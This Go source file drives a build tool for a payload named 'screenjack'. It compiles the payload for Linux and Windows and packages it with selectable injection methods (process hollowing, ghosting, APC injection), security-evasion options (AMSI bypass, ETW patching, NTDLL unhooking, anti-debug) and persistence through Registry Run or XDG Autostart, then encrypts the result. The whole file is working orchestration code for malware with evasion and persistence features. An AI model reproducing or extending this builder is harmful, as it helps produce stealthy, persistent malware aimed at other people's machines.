package main

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// Build state machine
type BuildState int

const (
	BuildIdle BuildState = iota
	BuildRunning
	BuildCancelling
)

func (s BuildState) String() string {
	return []string{"Idle", "Running", "Cancelling"}[s]
}

// Platform flags for conditional options
const (
	PlatWin = 1 << 0
	PlatLin = 1 << 1
	PlatAll = PlatWin | PlatLin
)

// BuildJob represents a single build request
type BuildJob struct {
	Targets    []string      // ["linux", "windows"]
	Asset      string        // selected asset path
	EmbedAsset bool          // true = embed, false = HTTP fetch
	PkgConfig  PackageConfig // snapshot from Package tab
	StartedAt  time.Time
}

// TargetProgress tracks per-target build status
type TargetProgress struct {
	Target string // "linux" or "windows"
	Phase  string // "compiling", "packaging", "encrypting", "done"
	Done   bool
	Error  string // empty if success
}

// Platform mappings for conditional options
var execMethodPlatform = map[int]int{
	0: PlatAll, // Raw Binary
	1: PlatWin, // Process Ghosting
	2: PlatWin, // Process Hollowing
	3: PlatWin, // Process Herpaderping
	4: PlatWin, // APC Injection
	5: PlatWin, // Thread Hijacking
	6: PlatWin, // Threadless Injection
	7: PlatWin, // Module Stomping
}

var evasionPlatform = map[int]int{
	0: PlatWin, // AMSI Bypass
	1: PlatWin, // ETW Patch
	2: PlatWin, // NTDLL Unhook
	3: PlatWin, // PPID Spoof
	4: PlatWin, // Block DLL Policy
	5: PlatWin, // Anti-Debug
	6: PlatWin, // Anti-Analysis
	7: PlatWin, // Direct Syscalls
}

var persistPlatform = map[int]int{
	0: PlatAll, // None
	1: PlatWin, // Registry Run
	2: PlatLin, // XDG Autostart
	3: PlatWin, // Self-Delete
}

// requiresWindows returns true if any Windows-only option is selected
func (cfg *PackageConfig) requiresWindows() bool {
	if plat, ok := execMethodPlatform[cfg.ExecMethod]; ok && plat == PlatWin {
		return true
	}
	for i, on := range cfg.Evasion {
		if on {
			if plat, ok := evasionPlatform[i]; ok && plat == PlatWin {
				return true
			}
		}
	}
	if cfg.PersistMethod == 1 || cfg.PersistMethod == 3 {
		return true
	}
	return false
}

// requiresLinux returns true if any Linux-only option is selected
func (cfg *PackageConfig) requiresLinux() bool {
	return cfg.PersistMethod == 2 // XDG Autostart
}

// FilteredOptions holds options applicable to a specific platform
type FilteredOptions struct {
	ExecMethod int
	Evasion    []bool
	Persist    int
	Encrypt    bool
}

// optionsForTarget returns only the options applicable to the given target
func optionsForTarget(target string, cfg *PackageConfig) FilteredOptions {
	plat := PlatLin
	if target == "windows" {
		plat = PlatWin
	}

	result := FilteredOptions{
		Encrypt: cfg.Encrypt,
	}

	// Filter exec method
	if p, ok := execMethodPlatform[cfg.ExecMethod]; ok && (p&plat) != 0 {
		result.ExecMethod = cfg.ExecMethod
	}

	// Filter evasion
	result.Evasion = make([]bool, len(cfg.Evasion))
	for i, on := range cfg.Evasion {
		if on {
			if p, ok := evasionPlatform[i]; ok && (p&plat) != 0 {
				result.Evasion[i] = true
			}
		}
	}

	// Filter persistence
	if p, ok := persistPlatform[cfg.PersistMethod]; ok && (p&plat) != 0 {
		result.Persist = cfg.PersistMethod
	}

	return result
}

// ValidationResult holds validation outcome
type ValidationResult struct {
	Valid          bool
	Error          string   // blocking error message
	MissingWindows bool     // Windows options selected but no Windows target
	MissingLinux   bool     // Linux options selected but no Linux target
	SkippedOptions []string // options that will be skipped
}

// ValidateBuild checks if a build job is valid
func ValidateBuild(targets []string, asset string, embedMode bool, cfg *PackageConfig) *ValidationResult {
	result := &ValidationResult{Valid: true}

	// Check targets
	if len(targets) == 0 {
		result.Valid = false
		result.Error = "Select at least one target"
		return result
	}

	// Check asset in embed mode
	if embedMode && asset == "" {
		result.Valid = false
		result.Error = "Select an asset first"
		return result
	}

	// Check platform mismatches
	hasWindows := false
	hasLinux := false
	for _, t := range targets {
		if t == "windows" || t == "x86_64-pc-windows-gnu" {
			hasWindows = true
		}
		if t == "linux" || t == "x86_64-unknown-linux-gnu" {
			hasLinux = true
		}
	}

	if cfg.requiresWindows() && !hasWindows {
		result.MissingWindows = true
	}
	if cfg.requiresLinux() && !hasLinux {
		result.MissingLinux = true
	}

	return result
}

// Tea messages for build updates
type progressMsg TargetProgress
type logMsg string
type buildCompleteMsg struct {
	Results   []TargetProgress
	Cancelled bool
}

// BuildResult summarizes a completed build
type BuildResult struct {
	Success   bool
	Partial   bool
	Cancelled bool
	Summary   string // "Linux ✓, Windows ✗"
}

func (m buildCompleteMsg) toResult() BuildResult {
	if m.Cancelled {
		return BuildResult{Cancelled: true, Summary: "Cancelled"}
	}

	var parts []string
	allOK := true
	anyOK := false

	for _, p := range m.Results {
		if p.Error != "" {
			parts = append(parts, p.Target+" ✗")
			allOK = false
		} else {
			parts = append(parts, p.Target+" ✓")
			anyOK = true
		}
	}

	return BuildResult{
		Success: allOK,
		Partial: !allOK && anyOK,
		Summary: strings.Join(parts, ", "),
	}
}

// StartBuild launches parallel builds for all targets in job
func StartBuild(ctx context.Context, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) <-chan buildCompleteMsg {
	doneCh := make(chan buildCompleteMsg, 1)

	go func() {
		var wg sync.WaitGroup
		results := make([]TargetProgress, len(job.Targets))
		var mu sync.Mutex

		for i, target := range job.Targets {
			wg.Add(1)
			go func(idx int, tgt string) {
				defer wg.Done()
				result := buildTarget(ctx, tgt, job, progressCh, logCh)
				mu.Lock()
				results[idx] = result
				mu.Unlock()
			}(i, target)
		}

		wg.Wait()

		doneCh <- buildCompleteMsg{
			Results:   results,
			Cancelled: ctx.Err() != nil,
		}
		close(doneCh)
	}()

	return doneCh
}

// buildTarget builds a single target with platform-appropriate options
func buildTarget(ctx context.Context, target string, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) TargetProgress {
	progress := TargetProgress{Target: target, Phase: "compiling"}
	progressCh <- progress

	// Determine cargo target
	cargoTarget := ""
	if target == "windows" || target == "x86_64-pc-windows-gnu" {
		cargoTarget = "x86_64-pc-windows-gnu"
	}

	// Build base payload
	args := []string{"build", "--release"}
	if cargoTarget != "" {
		args = append(args, "--target", cargoTarget)
	}
	if job.EmbedAsset && job.Asset != "" {
		args = append(args, "--features", "embedded")
	}

	logCh <- fmt.Sprintf("[%s] cargo %s", target, strings.Join(args, " "))

	cmd := exec.CommandContext(ctx, "cargo", args...)
	cmd.Dir = "../payload"

	// Set env for embedded asset
	if job.EmbedAsset && job.Asset != "" {
		cmd.Env = append(cmd.Environ(), "SCREENJACK_ASSET="+job.Asset)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() != nil {
			progress.Phase = "cancelled"
			progress.Error = "cancelled"
		} else {
			progress.Phase = "failed"
			progress.Error = err.Error()
			logCh <- fmt.Sprintf("[%s] ERROR: %s", target, string(output))
		}
		progress.Done = true
		progressCh <- progress
		return progress
	}

	logCh <- fmt.Sprintf("[%s] Compiled successfully", target)

	// Apply packaging steps based on filtered options
	opts := optionsForTarget(target, &job.PkgConfig)

	if (target == "windows" || target == "x86_64-pc-windows-gnu") && opts.ExecMethod > 0 {
		progress.Phase = "packaging"
		progressCh <- progress

		payloadPath := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"

		// Apply execution method
		var recipe string
		switch opts.ExecMethod {
		case 1:
			recipe = "ghost"
		case 2:
			recipe = "hollow"
		case 4:
			recipe = "inject"
		}
		if recipe != "" {
			logCh <- fmt.Sprintf("[%s] Applying %s...", target, recipe)
			pkgCmd := exec.CommandContext(ctx, "just", "-f", "package.just", recipe, payloadPath)
			pkgCmd.Dir = ".."
			if out, err := pkgCmd.CombinedOutput(); err != nil {
				logCh <- fmt.Sprintf("[%s] Package warning: %s", target, string(out))
			}
		}
	}

	// Apply encryption if selected
	if opts.Encrypt {
		progress.Phase = "encrypting"
		progressCh <- progress
		logCh <- fmt.Sprintf("[%s] Encrypting payload...", target)

		payloadPath := "../payload/target/release/screenjack"
		if target == "windows" || target == "x86_64-pc-windows-gnu" {
			payloadPath = "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		}
		encCmd := exec.CommandContext(ctx, "just", "-f", "package.just", "encrypt", payloadPath)
		encCmd.Dir = ".."
		if out, err := encCmd.CombinedOutput(); err != nil {
			logCh <- fmt.Sprintf("[%s] Encrypt warning: %s", target, string(out))
		}
	}

	progress.Phase = "done"
	progress.Done = true
	progressCh <- progress
	return progress
}
